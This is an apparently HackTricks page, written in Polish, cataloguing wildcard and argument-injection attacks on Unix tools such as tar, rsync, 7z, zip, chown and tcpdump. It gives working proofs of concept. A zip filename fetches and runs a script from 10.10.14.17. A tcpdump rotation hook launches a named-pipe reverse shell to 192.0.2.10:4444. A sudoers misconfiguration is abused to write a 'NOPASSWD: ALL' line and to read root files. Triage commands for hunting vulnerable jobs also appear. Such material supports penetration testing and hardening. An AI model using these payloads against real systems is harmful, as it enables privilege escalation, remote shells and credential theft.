# Wildcards Spare Tricks

{{#include ../../banners/hacktricks-training.md}}

> Wildcard (aka *glob*) **argument injection** występuje, gdy uprzywilejowany skrypt uruchamia binarkę Unix, taką jak `tar`, `chown`, `rsync`, `zip`, `7z`, … z nieujętym wildcardem, takim jak `*`.
> Ponieważ shell rozwija wildcard **przed** wykonaniem binarki, atakujący, który może tworzyć pliki w katalogu roboczym, może przygotować nazwy plików zaczynające się od `-`, dzięki czemu są interpretowane jako **opcje zamiast danych**, skutecznie przemycając dowolne flagi, a nawet komendy.
> Ta strona zbiera najprzydatniejsze prymitywy, najnowsze badania i nowoczesne detekcje dla lat 2023-2025.

## chown / chmod

Możesz **skopiować właściciela/grupę albo bity uprawnień dowolnego pliku** nadużywając flagi `--reference`:
```bash
# attacker-controlled directory
touch "--reference=/root/secret``file"   # ← filename becomes an argument
```
Gdy root później wykona coś takiego jak:
```bash
chown -R alice:alice *.php
chmod -R 644 *.php
```
`--reference=/root/secret``file` zostaje wstrzyknięte, powodując, że *wszystkie* pasujące pliki dziedziczą własność/uprawnienia `/root/secret``file`.

*PoC & tool*: [`wildpwn`](https://github.com/localh0t/wildpwn) (combined attack).
See also the classic DefenseCode paper for details.

---

## tar

### GNU tar (Linux, *BSD, busybox-full)

Wykonaj dowolne polecenia, nadużywając funkcji **checkpoint**:
```bash
# attacker-controlled directory
echo 'echo pwned > /tmp/pwn' > shell.sh
chmod +x shell.sh
touch "--checkpoint=1"
touch "--checkpoint-action=exec=sh shell.sh"
```
Gdy root uruchamia np. `tar -czf /root/backup.tgz *`, `shell.sh` zostaje wykonany jako root.

### bsdtar / macOS 14+

Domyślny `tar` w nowszym macOS (oparty na `libarchive`) nie implementuje `--checkpoint`, ale nadal możesz osiągnąć code-execution za pomocą flagi **--use-compress-program**, która pozwala określić zewnętrzny kompresor.
```bash
# macOS example
touch "--use-compress-program=/bin/sh"
```
Gdy uprzywilejowany skrypt uruchamia `tar -cf backup.tar *`, zostanie uruchomiony `/bin/sh`.

---

## rsync

`rsync` pozwala nadpisać zdalną powłokę, a nawet zdalny binarny plik, za pomocą flag wiersza poleceń zaczynających się od `-e` lub `--rsync-path`:
```bash
# attacker-controlled directory
touch "-e sh shell.sh"        # -e <cmd> => use <cmd> instead of ssh
```
Jeśli później root zarchiwizuje katalog za pomocą `rsync -az * backup:/srv/`, wstrzyknięty flag uruchomi twoją powłokę po stronie zdalnej.

*PoC*: [`wildpwn`](https://github.com/localh0t/wildpwn) (`rsync` mode).

---

## 7-Zip / 7z / 7za

Nawet gdy uprzywilejowany skrypt *defensywnie* poprzedza wildcard `--` (aby zatrzymać parsowanie opcji), format 7-Zip obsługuje **file list files** przez poprzedzenie nazwy pliku `@`. Połączenie tego z symlink pozwala ci *exfiltrate arbitrary files*:
```bash
# directory writable by low-priv user
cd /path/controlled
ln -s /etc/shadow   root.txt      # file we want to read
touch @root.txt                  # tells 7z to use root.txt as file list
```
Jeśli root wykona coś takiego jak:
```bash
7za a /backup/`date +%F`.7z -t7z -snl -- *
```
7-Zip spróbuje odczytać `root.txt` (→ `/etc/shadow`) jako listę plików i zakończy działanie, **wypisując zawartość na stderr**.

To działa mimo `-- *`, ponieważ 7-Zip CLI wyraźnie akceptuje zarówno zwykłe nazwy plików, jak i `@listfiles` jako wejście pozycyjne, więc literał typu `@root.txt` nadal jest traktowany specjalnie.

---

## zip

Istnieją dwa bardzo praktyczne primitive, gdy aplikacja przekazuje kontrolowane przez użytkownika nazwy plików do `zip` (czy to przez wildcard, czy przez enumerowanie nazw bez `--`).

- RCE via test hook: `-T` włącza „test archive”, a `-TT <cmd>` zastępuje tester dowolnym programem (long form: `--unzip-command <cmd>`). Jeśli możesz wstrzykiwać nazwy plików zaczynające się od `-`, rozdziel flagi na osobne nazwy plików, aby parsowanie short-options działało:
```bash
# Attacker-controlled filenames (e.g., in an upload directory)
# 1) A file literally named: -T
# 2) A file named: -TT wget 10.10.14.17 -O s.sh; bash s.sh; echo x
# 3) Any benign file to include (e.g., data.pcap)
# When the privileged code runs: zip out.zip <files...>
# zip will execute: wget 10.10.14.17 -O s.sh; bash s.sh; echo x
```
Uwagi
- Nie próbuj pojedynczej nazwy pliku jak `'-T -TT <cmd>'` — krótkie opcje są parsowane znak po znaku i to się nie powiedzie. Użyj osobnych tokenów, jak pokazano.
- Jeśli ukośniki są usuwane z nazw plików przez aplikację, pobierz z samego hosta/IP (domyślna ścieżka `/index.html`) i zapisz lokalnie z `-O`, a potem wykonaj.
- Możesz debugować parsowanie za pomocą `-sc` (pokaż przetworzone argv) albo `-h2` (więcej pomocy), aby zrozumieć, jak twoje tokeny są konsumowane.

Przykład (lokalne zachowanie na zip 3.0):
```bash
zip test.zip -T '-TT wget 10.10.14.17/shell.sh' test.pcap    # fails to parse
zip test.zip -T '-TT wget 10.10.14.17 -O s.sh; bash s.sh' test.pcap  # runs wget + bash
```
- Data exfil/leak: Jeśli warstwa web zwraca `zip` stdout/stderr (co jest częste w naiwnych wrapperach), wstrzyknięte flagi, takie jak `--help`, albo błędy z niepoprawnych opcji pojawią się w odpowiedzi HTTP, potwierdzając command-line injection i pomagając w dopasowaniu payloadu.

---

## Additional binaries vulnerable to wildcard injection (2023-2025 quick list)

Poniższe komendy były nadużywane w nowoczesnych CTF-ach i rzeczywistych środowiskach. Payload jest zawsze tworzony jako *filename* w katalogu z możliwością zapisu, który później zostanie przetworzony z użyciem wildcard:

| Binary | Flag to abuse | Effect |
| --- | --- | --- |
| `bsdtar` | `--newer-mtime=@<epoch>` → arbitrary `@file` | Read file contents |
| `flock` | `-c <cmd>` | Execute command |
| `git`   | `-c core.sshCommand=<cmd>` | Command execution via git over SSH |
| `scp`   | `-S <cmd>` | Spawn arbitrary program instead of ssh |

Te primitive są mniej częste niż klasyczne *tar/rsync/zip*, ale warto je sprawdzać podczas hunting.

---

## Hunting vulnerable wrappers and jobs

Najnowsze case studies pokazały, że wildcard/argv injection nie jest już tylko problemem **cron + tar**. Ta sama klasa błędu nadal pojawia się w:

- funkcjach web, które "download everything as zip/tar" z katalogów upload kontrolowanych przez atakującego
- vendor/appliance debug shells, które wystawiają wrapper **tcpdump** z polami filename/filter kontrolowanymi przez atakującego
- jobach backup lub rotation, które wywołują `tar`, `rsync`, `7z`, `zip`, `chown` lub `chmod` na katalogach z możliwością zapisu

Przydatne komendy triage:
```bash
# Hunt for interesting binaries fed with globs or positional user data
rg -n --hidden --follow \
'(tar|bsdtar|rsync|zip|7z|7za|chown|chmod|tcpdump).*(\*|\$@|\$\*)' \
/etc /opt /usr/local /srv 2>/dev/null

# Watch real argv during cron/systemd execution
pspy64 -pf -i 1000 | rg 'tar|rsync|zip|7z|tcpdump|chown|chmod'

# Sudoers rules that constrain one argument but still allow extra flags
sudo -l
rg -n 'tcpdump|zip|tar|rsync' /etc/sudoers /etc/sudoers.d 2>/dev/null
```
Szybkie heurystyki:

- `-- *` to dobre rozwiązanie dla wielu narzędzi GNU, ale **nie** dla `7z`/`7za`, ponieważ `@listfiles` są parsowane osobno.
- W przypadku `zip` szukaj wrapperów, które bezpośrednio wyliczają nazwy plików kontrolowane przez użytkownika; dzielenie krótkich opcji (`-T` + `-TT <cmd>`) nadal działa nawet bez globowania przez shell.
- W przypadku `tcpdump` zwracaj szczególną uwagę na wrappery, które pozwalają kontrolować **nazwy plików wyjściowych**, **ustawienia rotacji** lub argumenty **capture-file replay**.

---

## tcpdump rotation hooks (-G/-W/-z): RCE via argv injection in wrappers

Gdy ograniczony shell albo wrapper producenta buduje linię poleceń `tcpdump`, łącząc pola kontrolowane przez użytkownika (np. parametr „file name”) bez ścisłego cytowania/walidacji, można wstrzyknąć dodatkowe flagi `tcpdump`. Połączenie `-G` (rotacja oparta na czasie), `-W` (limit liczby plików) oraz `-z <cmd>` (polecenie po rotacji) daje arbitralne wykonanie poleceń jako użytkownik uruchamiający tcpdump (często root na appliance).

Warunki wstępne:

- Możesz wpływać na `argv` przekazywane do `tcpdump` (np. przez wrapper taki jak `/debug/tcpdump --filter=... --file-name=<HERE>`).
- Wrapper nie sanitizuje spacji ani tokenów zaczynających się od `-` w polu nazwy pliku.

Klasyczny PoC (uruchamia reverse shell script z zapisywalnej ścieżki):
```sh
# Reverse shell payload saved on the device (e.g., USB, tmpfs)
cat > /mnt/disk1_1/rce.sh <<'EOF'
#!/bin/sh
rm -f /tmp/f; mknod /tmp/f p; cat /tmp/f|/bin/sh -i 2>&1|nc 192.0.2.10 4444 >/tmp/f
EOF
chmod +x /mnt/disk1_1/rce.sh

# Inject additional tcpdump flags via the unsafe "file name" field
/debug/tcpdump --filter="udp port 1234" \
--file-name="test -i any -W 1 -G 1 -z /mnt/disk1_1/rce.sh"

# On the attacker host
nc -6 -lvnp 4444 &
# Then send any packet that matches the BPF to force a rotation
printf x | nc -u -6 [victim_ipv6] 1234
```
Szczegóły:

- `-G 1 -W 1` wymusza natychmiastową rotację po pierwszym dopasowanym pakiecie.
- `-z <cmd>` uruchamia polecenie post-rotate raz na każdą rotację. Wiele buildów wykonuje `<cmd> <savefile>`. Jeśli `<cmd>` jest skryptem/interpreterem, upewnij się, że obsługa argumentów pasuje do twojego payload.

Warianty bez removable-media:

- Jeśli masz jakikolwiek inny primitive do zapisu plików (np. osobny command wrapper, który pozwala na output redirection), wrzuć swój skrypt do znanej ścieżki i wyzwól `-z /bin/sh /path/script.sh` albo `-z /path/script.sh` w zależności od semantyki platformy.
- Niektóre vendor wrappers rotują do lokalizacji kontrolowanych przez attacker. Jeśli możesz wpływać na rotated path (symlink/directory traversal), możesz skierować `-z` tak, aby wykonało content, nad którym masz pełną kontrolę, bez external media.

---

## sudoers: tcpdump with wildcards/additional args → arbitrary write/read and root

Bardzo częsty anti-pattern w sudoers:
```text
(ALL : ALL) NOPASSWD: /usr/bin/tcpdump -c10 -w/var/cache/captures/*/<GUID-PATTERN> -F/var/cache/captures/filter.<GUID-PATTERN>
```
Problemy
- Glob `*` i permissive patterns ograniczają tylko pierwszy argument `-w`. `tcpdump` akceptuje wiele opcji `-w`; wygrywa ostatnia.
- Reguła nie przypina innych opcji, więc `-Z`, `-r`, `-V` itd. są dozwolone.

Primitives
- Nadpisz ścieżkę docelową drugim `-w` (pierwszy tylko spełnia sudoers):
```bash
sudo tcpdump -c10 -w/var/cache/captures/a/ \
-w /dev/shm/out.pcap \
-F /var/cache/captures/filter.aaaaaaaa-aaaa-aaaa-aaaa-aaaaaaaaaaaa
```
- Path traversal wewnątrz pierwszego `-w`, aby wyjść poza ograniczone drzewo:
```bash
sudo tcpdump -c10 \
-w/var/cache/captures/a/../../../../dev/shm/out \
-F/var/cache/captures/filter.aaaaaaaa-aaaa-aaaa-aaaa-aaaaaaaaaaaa
```
- Wymuś właściciela wyjścia za pomocą `-Z root` (tworzy pliki należące do root w dowolnym miejscu):
```bash
sudo tcpdump -c10 -w/var/cache/captures/a/ -Z root \
-w /dev/shm/root-owned \
-F /var/cache/captures/filter.aaaaaaaa-aaaa-aaaa-aaaa-aaaaaaaaaaaa
```
- Arbitrary-content write by replaying a crafted PCAP via `-r` (e.g., to drop a sudoers line):

<details>
<summary>Utwórz PCAP, który zawiera dokładny ASCII payload i zapisz go jako root</summary>
```bash
# On attacker box: craft a UDP packet stream that carries the target line
printf '\n\nfritz ALL=(ALL:ALL) NOPASSWD: ALL\n' > sudoers
sudo tcpdump -w sudoers.pcap -c10 -i lo -A udp port 9001 &
cat sudoers | nc -u 127.0.0.1 9001; kill %1

# On victim (sudoers rule allows tcpdump as above)
sudo tcpdump -c10 -w/var/cache/captures/a/ -Z root \
-r sudoers.pcap -w /etc/sudoers.d/1111-aaaa \
-F /var/cache/captures/filter.aaaaaaaa-aaaa-aaaa-aaaa-aaaaaaaaaaaa
```
</details>

- Arbitrary file read/secret leak with `-V <file>` (interprets a list of savefiles). Diagnostyka błędów często echo linie, ujawniając zawartość:
```bash
sudo tcpdump -c10 -w/var/cache/captures/a/ -V /root/root.txt \
-w /tmp/dummy \
-F /var/cache/captures/filter.aaaaaaaa-aaaa-aaaa-aaaa-aaaaaaaaaaaa
```
---

## Referencje

- [GTFOBins - tcpdump](https://gtfobins.github.io/gtfobins/tcpdump/)
- [GTFOBins - zip](https://gtfobins.github.io/gtfobins/zip/)
- [0xdf - HTB Dump: Zip arg injection to RCE + tcpdump sudo misconfig privesc](https://0xdf.gitlab.io/2025/11/04/htb-dump.html)
- [FiberGateway GR241AG - Full Exploit Chain](https://r0ny.net/FiberGateway-GR241AG-Full-Exploit-Chain/)
- [Elastic - Potential Shell via Wildcard Injection Detected](https://www.elastic.co/guide/en/security/current/prebuilt-rule-8-19-20-potential-shell-via-wildcard-injection-detected.html)

{{#include ../../banners/hacktricks-training.md}}
